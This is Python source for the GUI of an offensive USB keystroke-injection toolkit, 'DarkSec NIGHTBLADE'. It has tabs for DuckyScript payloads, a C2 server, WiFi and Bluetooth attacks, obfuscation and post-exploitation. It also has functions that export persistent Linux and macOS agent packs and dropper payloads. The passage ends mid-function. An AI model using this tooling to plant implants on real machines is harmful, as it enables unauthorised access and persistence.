
import ttkbootstrap as tk
from ttkbootstrap.constants import *
import tkinter as tkcore
from tkinter import Listbox

import subprocess
import sys
import threading
import serial
import serial.tools.list_ports
from tkinter import messagebox, filedialog, simpledialog, scrolledtext
from tkinter.ttk import Progressbar
import shutil
import os
import re
import time
import json
import hashlib
from datetime import datetime
import webbrowser
import urllib.request
import tempfile
import zipfile
import base64
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
import pickle

from c2_server import duckyscript_converter

try:
    _TK_CONSTS = (
        "X","Y","BOTH","LEFT","RIGHT","TOP","BOTTOM",
        "N","S","E","W","NW","NE","SW","SE","NS","EW","NSEW",
        "DISABLED","NORMAL","END","WORD","NONE","VERTICAL","HORIZONTAL",
        "SUNKEN","RAISED","FLAT","GROOVE","RIDGE","SOLID","CENTER","ACTIVE","INSERT"
    )
    for _name in _TK_CONSTS:
        if hasattr(tkcore, _name) and not hasattr(tk, _name):
            setattr(tk, _name, getattr(tkcore, _name))
    # Alias common widget naming differences
    if hasattr(tk, 'Labelframe') and not hasattr(tk, 'LabelFrame'):
        tk.LabelFrame = tk.Labelframe
except Exception:
    pass

class USBArmyKnifeInstaller(tk.Window):
    def __init__(self):
        super().__init__(themename="cyborg")

        self.title("DarkSec NIGHTBLADE - USB Army Knife Arsenal")
        self.geometry("900x650")
        self.iconify()  # Temporarily hide during setup
        self.deiconify()  # Show after title is set

        self.create_custom_theme()

        self.selected_drive = tk.StringVar()
        self._gh_token = os.environ.get("GITHUB_TOKEN") or None

        # Top bar with Help button
        topbar = tk.Frame(self)
        topbar.pack(fill=tk.X, padx=10, pady=(10, 0))
        help_btn = tk.Button(topbar, text="?", width=3, command=self.show_help)
        help_btn.pack(side=tk.RIGHT)

        self.notebook = tk.Notebook(self)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.create_welcome_tab()
        self.create_flasher_tab()
        self.create_efuse_tab()
        self.create_agent_tab()
        self.create_duckyscript_tab()
        self.create_payload_library_tab()
        self.create_serial_monitor_tab()
        self.create_profiles_tab()
        self.create_orchestration_tab()
        self.create_c2_server_tab()
        self.create_wifi_attack_tab()
        self.create_bluetooth_attack_tab()
        self.create_obfuscation_tab()
        self.create_social_engineering_tab()
        self.create_network_recon_tab()
        self.create_postexploit_tab()
        self.create_dashboard_tab()
        
        # Global scroll routing for wheel/touchpad across tabs
        try:
            self._active_scroll_canvas = None
            self._ensure_global_scroll_bindings()
        except Exception:
            pass
        
        # Enable copy/paste everywhere
        try:
            self._install_clipboard_support()
        except Exception:
            pass

        # Load saved preferences (e.g., keyboard layout)
        try:
            self._load_prefs()
        except Exception:
            pass

    def create_custom_theme(self):
        style = tk.Style()
        # Enhanced button styling with better padding and borders
        style.configure("TButton", foreground="#ff0000", padding=10, font=("Arial", 10))
        style.configure("Action.TButton", foreground="#ffffff", background="#ff0000", padding=12, font=("Arial", 11, "bold"))
        style.configure("TLabel", foreground="#ff0000", font=("Arial", 10))
        style.configure("Title.TLabel", foreground="#ff0000", font=("Arial", 14, "bold"))
        style.configure("TFrame", background="#000000")
        style.configure("Card.TFrame", background="#1a1a1a", relief="raised", borderwidth=1)
        style.configure("TNotebook", background="#000000")
        style.configure("TNotebook.Tab", foreground="#ff0000", background="#000000", padding=[20, 10])
        style.map("TNotebook.Tab", background=[("selected", "#ff0000")], foreground=[("selected", "#000000")])
        style.configure("TLabelframe", foreground="#ff0000", background="#000000", borderwidth=2)
        style.configure("TLabelframe.Label", foreground="#ff0000", font=("Arial", 11, "bold"))

    def create_welcome_tab(self):
        welcome_frame = tk.Frame(self.notebook, padding=20)
        self.notebook.add(welcome_frame, text="🏠 Welcome")

        # Header
        header_frame = tk.Frame(welcome_frame)
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        # ASCII Logo
        logo_text = '''╔═══════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗███████╗ ██████╗     ║
║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝██╔════╝     ║
║  ██║  ██║███████║██████╔╝█████╔╝ ███████╗█████╗  ██║          ║
║  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══╝  ██║          ║ 
║  ██████╔╝██║  ██║██║  ██║██║  ██╗███████║███████╗╚██████╗     ║
║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝     ║
║      ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗                  ║
║      ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝                  ║
║      ██╔██╗ ██║██║██║  ███╗███████║   ██║                     ║
║      ██║╚██╗██║██║██║   ██║██╔══██║   ██║                     ║
║      ██║ ╚████║██║╚██████╔╝██║  ██║   ██║                     ║
║      ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝                     ║
║     ██████╗ ██╗      █████╗ ██████╗ ███████╗                  ║
║     ██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝                  ║
║     ██████╔╝██║     ███████║██║  ██║█████╗                    ║
║     ██╔══██╗██║     ██╔══██║██║  ██║██╔══╝                    ║
║     ██████╔╝███████╗██║  ██║██████╔╝███████╗                  ║
║     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝                  ║
╚═══════════════════════════════════════════════════════════════╝'''
        
        logo_label = tk.Label(header_frame, text=logo_text, 
                             font=("Courier", 7), foreground="#00d2ff", justify="left")
        logo_label.pack()
        
        title_label = tk.Label(header_frame, text="DarkSec NIGHTBLADE", 
                              font=("Arial", 18, "bold"), foreground="#ff0000")
        title_label.pack(pady=(10, 5))
        
        subtitle = tk.Label(header_frame, text="USB Army Knife Exploitation Framework", 
                           font=("Arial", 11), foreground="#00d2ff")
        subtitle.pack()
        
        tagline = tk.Label(header_frame, text='"The blade that cuts through digital darkness"', 
                          font=("Arial", 9, "italic"), foreground="#888888")
        tagline.pack(pady=(2, 0))

        # Action buttons in a card
        action_card = tk.Frame(welcome_frame, style="Card.TFrame", padding=20)
        action_card.pack(fill=tk.X, pady=(0, 15))
        
        tk.Label(action_card, text="Quick Setup", font=("Arial", 12, "bold")).pack(anchor=tk.W, pady=(0, 10))
        
        button_frame = tk.Frame(action_card)
        button_frame.pack(fill=tk.X)
        
        setup_button = tk.Button(button_frame, text="🔧 Clone Repository & Update Submodules", 
                                command=self.setup_project, style="Action.TButton")
        setup_button.pack(fill=tk.X, pady=5)

        preflight_button = tk.Button(button_frame, text="✓ Run Preflight Checks", 
                                     command=self.run_preflight)
        preflight_button.pack(fill=tk.X, pady=5)

        # Output console
        console_frame = tk.LabelFrame(welcome_frame, text="Output")
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(15, 0))

        self.welcome_console_text = tk.Text(console_frame, height=10, bg="#0a0a0a", fg="#00ff00", 
                                           font=("Courier", 10), insertbackground="#00ff00")
        self.welcome_console_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def create_flasher_tab(self):
        flasher_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(flasher_frame, text="⚡ Flasher")

        # Device detection card
        device_frame = tk.LabelFrame(flasher_frame, text="📱 Device Selection", padding=15)
        device_frame.pack(fill=tk.X, pady=(0, 10))

        dev_inner = tk.Frame(device_frame)
        dev_inner.pack(fill=tk.X)
        
        self.device_combobox = tk.Combobox(dev_inner, state="readonly", font=("Arial", 10))
        self.device_combobox.pack(side=tk.LEFT, padx=(0, 10), pady=5, fill=tk.X, expand=True)

        btn_container = tk.Frame(dev_inner)
        btn_container.pack(side=tk.RIGHT)
        
        self.detect_button = tk.Button(btn_container, text="🔍 Detect", command=self.detect_devices)
        self.detect_button.pack(side=tk.LEFT, padx=5)
        
        self.help_button = tk.Button(btn_container, text="❓ Help", command=self.show_connection_help)
        self.help_button.pack(side=tk.LEFT)

        # Firmware installation card
        firmware_frame = tk.LabelFrame(flasher_frame, text="💾 Firmware Installation", padding=15)
        firmware_frame.pack(fill=tk.X, pady=(0, 10))

        # Options
        options_frame = tk.Frame(firmware_frame)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.erase_first_var = tk.IntVar(value=0)
        tk.Checkbutton(options_frame, text="Full erase before flash (esp32s3)", 
                      variable=self.erase_first_var).pack(anchor=tk.W, pady=2)

        self.low_baud_var = tk.IntVar(value=0)
        tk.Checkbutton(options_frame, text="Lower baud rate (115200)", 
                      variable=self.low_baud_var).pack(anchor=tk.W, pady=2)

        # Action buttons
        actions = tk.Frame(firmware_frame)
        actions.pack(fill=tk.X)
        
        self.install_button = tk.Button(actions, text="⬆️ Install Firmware", 
                                       command=self.install_firmware, style="Action.TButton")
        self.install_button.pack(fill=tk.X, pady=(0, 5))

        prebuilt_btn = tk.Button(actions, text="📦 Upload Prebuilt App (.bin)", 
                                command=self.flash_prebuilt_firmware)
        prebuilt_btn.pack(fill=tk.X, pady=(0, 5))

        self.uploadfs_button = tk.Button(actions, text="📁 Upload Filesystem Image", 
                                        command=self.upload_filesystem)
        self.uploadfs_button.pack(fill=tk.X)

        # Tools card
        tools_frame = tk.LabelFrame(flasher_frame, text="🛠️ Tools", padding=15)
        tools_frame.pack(fill=tk.X, pady=(0, 10))
        
        tools_inner = tk.Frame(tools_frame)
        tools_inner.pack(fill=tk.X)
        
        tk.Button(tools_inner, text="🌐 Open Web UI", 
                 command=lambda: webbrowser.open("http://4.3.2.1:8080")).pack(side=tk.LEFT, padx=(0, 10), expand=True, fill=tk.X)
        tk.Button(tools_inner, text="💳 SD Card Assistant", 
                 command=self.sd_card_assistant).pack(side=tk.LEFT, expand=True, fill=tk.X)

        # Output console
        console_frame = tk.LabelFrame(flasher_frame, text="📄 Output Log", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)

        self.flasher_console_text = tk.Text(console_frame, height=10, bg="#0a0a0a", fg="#00ff00",
                                           font=("Courier", 9), insertbackground="#00ff00")
        self.flasher_console_text.pack(fill=tk.BOTH, expand=True)

    def create_efuse_tab(self):
        efuse_frame = tk.Frame(self.notebook)
        self.notebook.add(efuse_frame, text="eFuse")

        # Add eFuse related widgets
        warning_label = tk.Label(efuse_frame, text="WARNING: Burning eFuses is an irreversible process!", foreground="red")
        warning_label.pack(pady=10)

        summary_button = tk.Button(efuse_frame, text="Read eFuse Summary", command=self.read_efuse_summary)
        summary_button.pack(pady=10)

        self.burn_efuse_check_var = tk.IntVar()
        self.burn_efuse_check = tk.Checkbutton(efuse_frame, text="Enable eFuse Burning", variable=self.burn_efuse_check_var, command=self.toggle_burn_button)
        self.burn_efuse_check.pack(pady=5)

        self.burn_button = tk.Button(efuse_frame, text="Burn USB_PHY_SEL eFuse", command=self.burn_efuse, state=tk.DISABLED)
        self.burn_button.pack(pady=10)

        # Output console
        console_frame = tk.LabelFrame(efuse_frame, text="Output")
        console_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.efuse_console_text = tk.Text(console_frame, height=10)
        self.efuse_console_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _write_file(self, path: str, data: bytes):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)

    def export_linux_agent_pack(self):
        try:
            outdir = filedialog.askdirectory(title="Select output directory for Linux agent pack")
            if not outdir:
                return
            # Stage files from agents/ into output
            base = os.path.abspath(os.path.join(os.path.dirname(__file__), 'agents'))
            # Agent binary/script name expected: db-agent
            src_agent = os.path.join(base, 'db_agent.py')
            agent_bin = os.path.join(outdir, 'db-agent')
            with open(src_agent, 'rb') as f:
                content = f.read()
            self._write_file(agent_bin, b"#!/usr/bin/env python3\n" + content)
            os.chmod(agent_bin, 0o755)
            # Service
            with open(os.path.join(base, 'linux', 'db-agent.service'), 'rb') as f:
                self._write_file(os.path.join(outdir, 'db-agent.service'), f.read())
            # Installer
            with open(os.path.join(base, 'linux', 'install.sh'), 'rb') as f:
                inst = os.path.join(outdir, 'install.sh')
                self._write_file(inst, f.read())
                os.chmod(inst, 0o755)
            self.agent_console_text.insert(tk.END, f"Exported Linux agent pack to {outdir}\n")
        except Exception as e:
            messagebox.showerror("Export Linux Agent", str(e))

    def export_macos_agent_pack(self):
        try:
            outdir = filedialog.askdirectory(title="Select output directory for macOS agent pack")
            if not outdir:
                return
            base = os.path.abspath(os.path.join(os.path.dirname(__file__), 'agents'))
            src_agent = os.path.join(base, 'db_agent.py')
            agent_bin = os.path.join(outdir, 'db-agent')
            with open(src_agent, 'rb') as f:
                content = f.read()
            self._write_file(agent_bin, b"#!/usr/bin/env python3\n" + content)
            os.chmod(agent_bin, 0o755)
            # LaunchAgent plist
            with open(os.path.join(base, 'macos', 'com.darkblade.agent.plist'), 'rb') as f:
                self._write_file(os.path.join(outdir, 'com.darkblade.agent.plist'), f.read())
            # Installer
            with open(os.path.join(base, 'macos', 'install_mac.sh'), 'rb') as f:
                inst = os.path.join(outdir, 'install_mac.sh')
                self._write_file(inst, f.read())
                os.chmod(inst, 0o755)
            self.agent_console_text.insert(tk.END, f"Exported macOS agent pack to {outdir}\n")
        except Exception as e:
            messagebox.showerror("Export macOS Agent", str(e))

    def generate_agent_dropper_payloads(self):
        try:
            # Copy payload templates into payloads directory if not present
            os.makedirs('payloads', exist_ok=True)
            base = os.path.abspath(os.path.join(os.path.dirname(__file__), 'payloads'))
            # Nothing to copy from base; ensure our new JSONs exist already
            self.agent_console_text.insert(tk.END, "Agent dropper payloads available:\n")
            self.agent_console_text.insert(tk.END, " - payloads/Linux_Agent_Dropper.json\n")
            self.agent_console_text.insert(tk.END, " - payloads/macOS_Agent_Dropper.json\n")
            # Refresh Library if present
            try:
                self.filter_payloads()
            except Exception:
                pass
            messagebox.showinfo("Payloads", "Linux/macOS Agent dropper payloads are available in the Payload Library.")
        except Exception as e:
            messagebox.showerror("Agent Payloads", str(e))

    def create_agent_tab(self):
        agent_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(agent_frame, text="🎯 Agent")

        # Drive selection card
        drive_frame = tk.LabelFrame(agent_frame, text="💾 USBArmyKnife Drive", padding=15)
        drive_frame.pack(fill=tk.X, pady=(0, 10))

        drive_inner = tk.Frame(drive_frame)
        drive_inner.pack(fill=tk.X)
        
        tk.Label(drive_inner, text="Selected:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.drive_label = tk.Label(drive_inner, textvariable=self.selected_drive, 
                                    font=("Courier", 10), foreground="#00d2ff")
        self.drive_label.pack(side=tk.LEFT, fill=tk.X, expand=True)

        select_drive_button = tk.Button(drive_inner, text="📂 Select Drive", command=self.select_drive)
        select_drive_button.pack(side=tk.RIGHT, padx=(10, 0))

        # Agent image builder
        img_frame = tk.LabelFrame(agent_frame, text="🔧 Agent Image Builder (agent.img)", padding=15)
        img_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Row 0: Source
        tk.Label(img_frame, text="Source folder:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=8)
        self.agent_pubdir_var = tk.StringVar()
        tk.Entry(img_frame, textvariable=self.agent_pubdir_var, font=("Courier", 9)).grid(
            row=0, column=1, sticky=tk.EW, padx=(0, 10), pady=8)
        tk.Button(img_frame, text="📁 Browse Folder", command=self.browse_agent_pubdir).grid(
            row=0, column=2, padx=5, pady=8)
        tk.Button(img_frame, text="📦 Select Zip", command=self.select_agent_zip).grid(
            row=0, column=3, padx=5, pady=8)
        
        # Row 1: Size and build
        tk.Label(img_frame, text="Image size (MiB):").grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=8)
        self.agent_img_size_var = tk.StringVar(value="500")
        size_entry = tk.Entry(img_frame, width=10, textvariable=self.agent_img_size_var, font=("Arial", 10))
        size_entry.grid(row=1, column=1, sticky=tk.W, padx=(0, 10), pady=8)
        tk.Button(img_frame, text="⚙️ Create agent.img", command=self.create_agent_image, 
                 style="Action.TButton").grid(row=1, column=2, columnspan=2, sticky=tk.EW, padx=5, pady=8)
        
        # Row 2: Download options
        tk.Label(img_frame, text="Or download:").grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=8)
        tk.Button(img_frame, text="⬇️ Download from GitHub", command=self.download_prebuilt_agent).grid(
            row=2, column=1, columnspan=2, sticky=tk.EW, padx=(0, 5), pady=8)
        tk.Button(img_frame, text="🔑 Set Token", command=self.prompt_github_token).grid(
            row=2, column=3, padx=5, pady=8)
        
        # Row 3: Output path
        tk.Label(img_frame, text="Output path:").grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=8)
        self.agent_img_path_var = tk.StringVar(value=os.path.abspath("agent.img"))
        tk.Entry(img_frame, textvariable=self.agent_img_path_var, font=("Courier", 9)).grid(
            row=3, column=1, sticky=tk.EW, padx=(0, 10), pady=8)
        tk.Button(img_frame, text="📄 Select Existing", command=self.select_existing_agent_img).grid(
            row=3, column=2, columnspan=2, sticky=tk.EW, padx=5, pady=8)
        
        img_frame.columnconfigure(1, weight=1)

        # Deployment actions
        deploy_frame = tk.Frame(agent_frame)
        deploy_frame.pack(fill=tk.X, pady=(0, 10))
        
        copy_agent_button = tk.Button(deploy_frame, text="✅ Copy agent.img to Drive", 
                                     command=self.copy_agent_files, style="Action.TButton")
        copy_agent_button.pack(fill=tk.X, pady=(0, 5))

        reset_btn = tk.Button(deploy_frame, text="🔄 Create RESET flag (optional)", command=self.create_reset_flag)
        reset_btn.pack(fill=tk.X)

        # Cross-Platform Agent (Linux/macOS)
        xplat = tk.LabelFrame(agent_frame, text="🐧🍎 Cross-Platform Agent (Linux/macOS)", padding=15)
        xplat.pack(fill=tk.X, pady=(0, 10))

        tk.Button(xplat, text="📦 Export Linux Agent Pack", command=self.export_linux_agent_pack).pack(fill=tk.X, pady=3)
        tk.Button(xplat, text="📦 Export macOS Agent Pack", command=self.export_macos_agent_pack).pack(fill=tk.X, pady=3)
        tk.Button(xplat, text="📝 Generate Agent Dropper Payloads", command=self.generate_agent_dropper_payloads).pack(fill=tk.X, pady=3)

        # Output console
        console_frame = tk.LabelFrame(agent_frame, text="📄 Output Log", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)

        self.agent_console_text = tk.Text(console_frame, height=10, bg="#0a0a0a", fg="#00ff00",
                                         font=("Courier", 9), insertbackground="#00ff00")
        self.agent_console_text.pack(fill=tk.BOTH, expand=True)

    def create_duckyscript_tab(self):
        duckyscript_frame = tk.Frame(self.notebook)
        self.notebook.add(duckyscript_frame, text="DuckyScript")
        try:
            # Remember the main notebook tab id for later selection
            self._main_tab_duckyscript = self.notebook.tabs()[-1]
        except Exception:
            pass

        ducky_notebook = tk.Notebook(duckyscript_frame)
        ducky_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        # Keep a reference to the inner notebook for programmatic tab switching
        self.ducky_notebook = ducky_notebook

        self.create_editor_tab(ducky_notebook)
        self.create_converter_tab(ducky_notebook)
        self.create_guide_tab(ducky_notebook)
        self.create_library_tab(ducky_notebook)

    def create_library_tab(self, ducky_notebook):
        library_frame = tk.Frame(ducky_notebook)
        ducky_notebook.add(library_frame, text="Library")

        controls = tk.Frame(library_frame)
        controls.pack(fill=tk.X, padx=5, pady=5)
        tk.Label(controls, text="Search:").pack(side=tk.LEFT, padx=5)
        self.library_search = tk.Entry(controls)
        self.library_search.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        tk.Button(controls, text="Filter", command=self.filter_library).pack(side=tk.LEFT, padx=5)
        tk.Button(controls, text="Import .ds", command=self.import_duckyscript).pack(side=tk.LEFT, padx=5)
        tk.Button(controls, text="Refresh", command=self.load_duckyscript_library).pack(side=tk.LEFT, padx=5)
        tk.Button(controls, text="Export Selected", command=self.export_selected_duckyscript).pack(side=tk.LEFT, padx=5)

        self.library_tree = tk.Treeview(library_frame, columns=("Description"), show="headings")
        self.library_tree.heading("Description", text="Description")
        self.library_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.load_duckyscript_library()

        self.library_tree.bind("<<TreeviewSelect>>", self.on_library_select)


    def create_editor_tab(self, ducky_notebook):
        editor_frame = tk.Frame(ducky_notebook)
        ducky_notebook.add(editor_frame, text="Editor")

        # Manifest controls
        manifest_frame = tk.LabelFrame(editor_frame, text="Manifest")
        manifest_frame.pack(fill=tk.X, padx=5, pady=5)
        tk.Label(manifest_frame, text="Name").grid(row=0, column=0, padx=5, pady=5, sticky=W)
        self.manifest_name = tk.Entry(manifest_frame)
        self.manifest_name.grid(row=0, column=1, padx=5, pady=5, sticky=EW)
        tk.Label(manifest_frame, text="Target OS").grid(row=0, column=2, padx=5, pady=5, sticky=W)
        self.target_os = tk.Combobox(manifest_frame, state="readonly", values=["windows","linux","macos","generic"]) 
        self.target_os.grid(row=0, column=3, padx=5, pady=5, sticky=EW)
        self.target_os.set("generic")
        try:
            self.target_os.bind("<<ComboboxSelected>>", self._on_target_os_changed)
        except Exception:
            pass
        manifest_frame.columnconfigure(1, weight=1)

        notes_frame = tk.Frame(manifest_frame)
        notes_frame.grid(row=1, column=0, columnspan=4, sticky=EW, padx=5)
        tk.Label(notes_frame, text="Notes").pack(side=tk.LEFT)
        self.manifest_notes = tk.Entry(notes_frame)
        self.manifest_notes.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Editor
        self.duckyscript_editor = tk.Text(editor_frame, wrap=tk.NONE, undo=True)
        self.duckyscript_editor.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self._setup_highlight()
        self.duckyscript_editor.bind("<KeyRelease>", lambda e: self._highlight_editor())

        # Lint output
        lint_frame = tk.LabelFrame(editor_frame, text="Linter")
        lint_frame.pack(fill=tk.X, padx=5, pady=5)
        self.lint_output = tk.Text(lint_frame, height=4, state=tk.DISABLED)
        self.lint_output.pack(fill=tk.X, padx=5, pady=5)

        # Controls
        controls_frame = tk.Frame(editor_frame)
        controls_frame.pack(fill=tk.X, pady=5)

        tk.Label(controls_frame, text="Layout").pack(side=tk.LEFT, padx=5)
        self.layout_combobox = tk.Combobox(controls_frame, state="readonly")
        self.layout_combobox.pack(side=tk.LEFT, padx=5, pady=5)
        self.populate_keyboard_layouts()
        # Save prefs when layout changes
        try:
            self.layout_combobox.bind("<<ComboboxSelected>>", lambda e: self._save_prefs())
        except Exception:
            pass

        tk.Button(controls_frame, text="Import...", command=self.import_script_to_editor).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Insert Template", command=self.insert_template).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Lint", command=self.run_lint).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Fill Parameters", command=self.fill_parameters).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Calibrate Delays", command=self.calibrate_delays).pack(side=tk.LEFT, padx=5)
        
        # OS porting controls
        self.auto_port_var = tk.IntVar(value=0)
        tk.Checkbutton(controls_frame, text="Auto-port on Save", variable=self.auto_port_var).pack(side=tk.LEFT, padx=10)
        tk.Button(controls_frame, text="Port to OS", command=self.port_script_now).pack(side=tk.LEFT, padx=5)

        self.armed_var = tk.IntVar(value=0)
        tk.Checkbutton(controls_frame, text="Armed (consent)", variable=self.armed_var).pack(side=tk.LEFT, padx=10)

        tk.Button(controls_frame, text="Run Simulation", command=self.run_simulation).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Step", command=self.step_simulation).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="Stop", command=self.stop_simulation).pack(side=tk.LEFT, padx=5)

        tk.Button(controls_frame, text="Package to Drive...", command=self.package_to_drive).pack(side=tk.RIGHT, padx=5)
        save_button = tk.Button(controls_frame, text="Save to Device", command=self.save_duckyscript)
        save_button.pack(side=tk.RIGHT, padx=5, pady=5)

        # Simulator View
        sim_frame = tk.LabelFrame(editor_frame, text="Simulator")
        sim_frame.pack(fill=tk.BOTH, expand=False, padx=5, pady=5)
        self.sim_list = tkcore.Listbox(sim_frame, height=8)
        self.sim_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self._sim_events = []
        self._sim_running = False
        self._sim_index = 0

    def create_converter_tab(self, ducky_notebook):
        converter_frame = tk.Frame(ducky_notebook)
        ducky_notebook.add(converter_frame, text="Converter")
        try:
            # Remember converter tab id for later selection
            self._ducky_converter_tab = ducky_notebook.tabs()[-1]
        except Exception:
            pass

        # Add converter widgets
        from_label = tk.Label(converter_frame, text="From:")
        from_label.pack(pady=5)

        self.from_combobox = tk.Combobox(converter_frame, state="readonly", values=["BadUSB", "BadKB"])
        self.from_combobox.pack(pady=5)

        to_label = tk.Label(converter_frame, text="To:")
        to_label.pack(pady=5)

        self.to_combobox = tk.Combobox(converter_frame, state="readonly", values=["DuckyScript 1.0", "DuckyScript 2.0", "DuckyScript 3.0"])
        self.to_combobox.pack(pady=5)

        tk.Button(converter_frame, text="Import to Editor...", command=self.import_script_to_editor).pack(pady=5)
        convert_button = tk.Button(converter_frame, text="Convert", command=self.convert_script)
        convert_button.pack(pady=10)

        self.converted_text = tk.Text(converter_frame, height=10)
        self.converted_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def convert_script(self):
        script = self.duckyscript_editor.get("1.0", tk.END)
        from_format = self.from_combobox.get()
        to_format = self.to_combobox.get()

        converted_script = ""
        if from_format == "BadUSB":
            converted_script = duckyscript_converter.convert_badusb_to_duckyscript(script, to_format)
        elif from_format == "BadKB":
            converted_script = duckyscript_converter.convert_badkb_to_duckyscript(script, to_format)

        self.converted_text.delete("1.0", tk.END)
        self.converted_text.insert(tk.END, converted_script)


    def create_guide_tab(self, ducky_notebook):
        guide_frame = tk.Frame(ducky_notebook)
        ducky_notebook.add(guide_frame, text="Guide")

        # Add guide content
        guide_text = tk.Text(guide_frame, wrap=tk.WORD)
        guide_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        guide_content = """
# DuckyScript Guide

## DuckyScript 1.0

### Commands

*   `REM`: Comment
*   `DELAY`: Delay in milliseconds
*   `STRING`: Type a string
*   `ENTER`: Press the enter key
*   `GUI`: Press the GUI (Windows) key
*   `CTRL`: Press the control key
*   `ALT`: Press the alt key
*   `SHIFT`: Press the shift key

### Example

```
REM Open notepad
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 500
STRING Hello, World!
```

## DuckyScript 2.0

### New Commands

*   `DEFAULT_DELAY` / `DEFAULTDELAY`: Set a default delay between commands
*   `REPEAT`: Repeat the last command

### Example

```
DEFAULT_DELAY 100
GUI r
STRING notepad
ENTER
STRING Hello
REPEAT 5
```

## DuckyScript 3.0

### New Features

*   Variables
*   `if/then/else` statements
*   `while` loops
*   Functions
*   OS detection

### Example

```
$my_var = "Hello, World!"

if ($os == "windows") then
    GUI r
    DELAY 500
    STRING notepad
    ENTER
    DELAY 500
    STRING $my_var
endif
```
        """

        guide_text.insert(tk.END, guide_content)



    def load_duckyscript_library(self):
        """Load scripts from duckyscripts/ and c2_server/duckyscripts, ensuring unique content"""
        self._library_cache = []
        self.library_tree.delete(*self.library_tree.get_children())
        sources = ["duckyscripts", os.path.join("c2_server", "duckyscripts")]
        seen_hashes = set()
        def normalize(text: str) -> str:
            text = text.replace("\r\n", "\n").replace("\r", "\n")
            return "\n".join(line.rstrip() for line in text.splitlines())
        for script_dir in sources:
            if not os.path.exists(script_dir):
                continue
            for filename in sorted(os.listdir(script_dir)):
                if not filename.endswith(".ds"):
                    continue
                filepath = os.path.join(script_dir, filename)
                description = filename
                try:
                    with open(filepath, "r", errors="ignore") as f:
                        content = f.read()
                    # Uniqueness by normalized content hash
                    h = hashlib.sha256(normalize(content).encode("utf-8", errors="ignore")).hexdigest()
                    if h in seen_hashes:
                        continue
                    seen_hashes.add(h)
                    # Pull description from first REM lines if present
                    header_lines = content.splitlines()[:5]
                    for line in header_lines:
                        if line.strip().upper().startswith("REM "):
                            txt = line.strip()[4:].strip()
                            if txt.lower().startswith("description:"):
                                description = txt.split(":", 1)[1].strip()
                                break
                            elif txt:
                                description = txt
                except Exception:
                    pass
                self._library_cache.append((description, filepath))
                self.library_tree.insert("", tk.END, values=(description, filepath))

    def on_library_select(self, event):
        selected_item = self.library_tree.focus()
        if selected_item:
            filepath = self.library_tree.item(selected_item, "values")[1]
            with open(filepath, "r", errors="ignore") as f:
                script_content = f.read()
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, script_content)
            self._highlight_editor()
            self.run_lint()


    def setup_project(self):
        self.welcome_console_text.delete("1.0", tk.END)
        self.welcome_console_text.insert(tk.END, "Setting up project...\n")
        self.welcome_console_text.update()

        thread = threading.Thread(target=self._setup_project_thread)
        thread.start()

    def _setup_project_thread(self):
        try:
            # Clone repository
            self.run_command("git clone https://github.com/i-am-shodan/USBArmyKnife.git", self.welcome_console_text)
            
            # Update submodules
            self.run_command("git submodule update --init --recursive", self.welcome_console_text, cwd="USBArmyKnife")

            self.welcome_console_text.insert(tk.END, "\nProject setup complete!\n")
        except Exception as e:
            self.welcome_console_text.insert(tk.END, f"\nError during project setup: {e}\n")

    def run_command(self, command, console_widget, cwd=None):
        os.makedirs("logs", exist_ok=True)
        log_path = os.path.join("logs", datetime.utcnow().strftime("installer-%Y%m%d.log"))
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, cwd=cwd)
        with open(log_path, "a", encoding="utf-8") as lf:
            lf.write(f"\n[{datetime.utcnow().isoformat()}Z] CMD: {command}\n")
            while True:
                output = process.stdout.readline()
